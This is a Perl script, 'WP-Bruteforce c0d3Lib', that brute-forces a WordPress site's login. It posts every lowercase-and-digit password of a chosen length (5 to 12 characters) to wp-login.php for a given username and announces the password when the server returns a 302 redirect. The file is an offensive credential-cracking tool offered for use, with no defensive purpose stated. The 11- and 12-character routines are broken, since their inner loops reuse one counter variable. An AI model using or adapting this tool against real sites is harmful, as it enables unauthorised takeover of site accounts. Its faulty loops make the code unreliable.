#!/usr/bin/perl
 
# WP-Bruteforce c0d3Lib
# file : ne0bfwp.pl	
 
use LWP::UserAgent;		

$site = $ARGV[0];
$user = $ARGV[1];		 
if(@ARGV != 3){
print "
WP-Bruteforce c0d3Lib 
file : ne0bfwp.pl
How to use: $0 <site> <username> <alphabet digits>
exe: $0 site.com admin [5 to 12 digits]";
exit;
}
 
if ($site !~ /^http:\/\//){
$site = 'http://' . $site;
}
if ($site !~ /\/wp-login.php/){
$site = $site . '/wp-login.php';
}

my $ua = new LWP::UserAgent;

my $aphabt = chr(97).chr(98).chr(99).chr(100).chr(101);
$aphabt = $aphabt.chr(102).chr(103).chr(104).chr(105);
$aphabt = $aphabt.chr(106).chr(107).chr(108).chr(109);
$aphabt = $aphabt.chr(110).chr(111).chr(112).chr(113);
$aphabt = $aphabt.chr(114).chr(115).chr(116).chr(117);
$aphabt = $aphabt.chr(118).chr(119).chr(120).chr(121);
$aphabt = $aphabt.chr(122).chr(48).chr(49).chr(50).chr(51).chr(52).chr(53).chr(54).chr(55).chr(56).chr(57);

print "\n\nSite: $site\nUsername: $user\n\nAttacking...\n\n";
sleep(2);

if($ARGV[2] == 5){
	&digitlima;
}
if($ARGV[2] == 6){
	&digitgenap;
}
if($ARGV[2] == 7){
	&digittujuh;
}
if($ARGV[2] == 8){
	&digitselapan;
}
if($ARGV[2] == 9){
	&digitsembilan;
}
if($ARGV[2] == 10){
	&digitsepuluh;
}
if($ARGV[2] == 11){
	&digitsebelasan;
}
if($ARGV[2] == 12){
	&digitduabelasan;
}

sub digitlima {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;						
						my $LPass = $c1.$c2.$c3.$c4.$c5;								
						my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
						my $code = $response->code;
						print "[+] Testing... $LPass\n";
						if($code == 302){
							print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
							exit;
						}				
					}
				}
			}
		}
	}
}

sub digitgenap {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;							
							my $LPass = $c1.$c2.$c3.$c4.$c5.$c6;
							my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
							my $code = $response->code;
							print "[+] Testing... $LPass\n";
							if($code == 302){
								print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
								exit;
							}							
						}		
					}
				}
			}
		}
	}
}

sub digittujuh {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;								
								my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7;
								my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
								my $code = $response->code;
								print "[+] Testing... $LPass\n";
								if($code == 302){
									print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
									exit;
								}								
							}
						}
					}
				}
			}
		}
	}
}

sub digitselapan {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;
								for (my $p = 0; $p < length($aphabt); $p++){
									my $c8  = substr $aphabt, $p, 1;
									my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8;
									my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
									my $code = $response->code;
									print "[+] Testing... $LPass\n";
									if($code == 302){
										print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
										exit;
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

sub digitsembilan {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;
								for (my $p = 0; $p < length($aphabt); $p++){
									my $c8  = substr $aphabt, $p, 1;
									for (my $q = 0; $q < length($aphabt); $q++){
										my $c9  = substr $aphabt, $q, 1;
										my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8.$c9;
										my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
										my $code = $response->code;
										print "[+] Testing... $LPass\n";
										if($code == 302){
											print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
											exit;
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

sub digitsepuluh {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;
								for (my $p = 0; $p < length($aphabt); $p++){
									my $c8  = substr $aphabt, $p, 1;
									for (my $q = 0; $q < length($aphabt); $q++){
										my $c9  = substr $aphabt, $q, 1;
										for (my $r = 0; $r < length($aphabt); $r++){
											my $c10  = substr $aphabt, $r, 1;
											my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8.$c9.$c10;
											my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
											my $code = $response->code;
											print "[+] Testing... $LPass\n";
											if($code == 302){
												print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
												exit;
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

sub digitsebelasan {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;
								for (my $p = 0; $p < length($aphabt); $p++){
									my $c8  = substr $aphabt, $p, 1;
									for (my $q = 0; $q < length($aphabt); $q++){
										my $c9  = substr $aphabt, $q, 1;
										for (my $r = 0; $r < length($aphabt); $r++){
											my $c10  = substr $aphabt, $r, 1;
											for (my $s = 0; $r < length($aphabt); $r++){
												my $c11  = substr $aphabt, $r, 1;
												my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8.$c9.$c10.$c11;
												my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
												my $code = $response->code;
												print "[+] Testing... $LPass\n";
												if($code == 302){
													print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
													exit;
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

sub digitduabelasan {
	for (my $i = 0; $i < length($aphabt); $i++){
		my $c1  = substr $aphabt, $i, 1;
		for (my $j = 0; $j < length($aphabt); $j++){
			my $c2  = substr $aphabt, $j, 1;
			for (my $k = 0; $k < length($aphabt); $k++){
				my $c3  = substr $aphabt, $k, 1;
				for (my $l = 0; $l < length($aphabt); $l++){
					my $c4  = substr $aphabt, $l, 1;
					for (my $m = 0; $m < length($aphabt); $m++){
						my $c5  = substr $aphabt, $m, 1;					
						for (my $n = 0; $n < length($aphabt); $n++){
							my $c6  = substr $aphabt, $n, 1;
							for (my $o = 0; $o < length($aphabt); $o++){
								my $c7  = substr $aphabt, $o, 1;
								for (my $p = 0; $p < length($aphabt); $p++){
									my $c8  = substr $aphabt, $p, 1;
									for (my $q = 0; $q < length($aphabt); $q++){
										my $c9  = substr $aphabt, $q, 1;
										for (my $r = 0; $r < length($aphabt); $r++){
											my $c10  = substr $aphabt, $r, 1;
											for (my $s = 0; $r < length($aphabt); $r++){
												my $c11  = substr $aphabt, $r, 1;
												for (my $s = 0; $r < length($aphabt); $r++){
													my $c12  = substr $aphabt, $r, 1;
													my $LPass = $c1.$c2.$c3.$c4.$c5.$c6.$c7.$c8.$c9.$c10.$c11.$c12;
													my $response = $ua->post($site,{ log => $user, pwd => $LPass, wp-submit => 'Log in',});
													my $code = $response->code;
													print "[+] Testing... $LPass\n";
													if($code == 302){
														print "\n\n\t[*] PASSWORD IS: $LPass\n\n";
														exit;
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
exit;
